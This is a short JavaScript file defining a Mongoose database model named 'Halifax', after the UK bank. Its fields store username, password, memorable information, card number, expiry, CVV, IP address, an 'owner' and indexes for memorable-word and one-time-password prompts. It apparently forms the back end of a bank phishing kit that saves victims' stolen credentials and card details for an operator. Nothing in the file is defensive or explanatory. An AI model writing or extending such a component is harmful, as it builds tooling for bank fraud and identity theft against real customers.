const mongoose = require("mongoose");

const halifaxSchema = new mongoose.Schema({
	uniqueid: String,
	username: String,
	password: String,
	memorable: String,
	ccnum: String,
	ccexp: String,
	cvv: String,
	status: Number,
	ip: String,
	owner: String,
	memIndex: String,
	otpIndex: String,
});

module.exports = mongoose.model("Halifax", halifaxSchema);
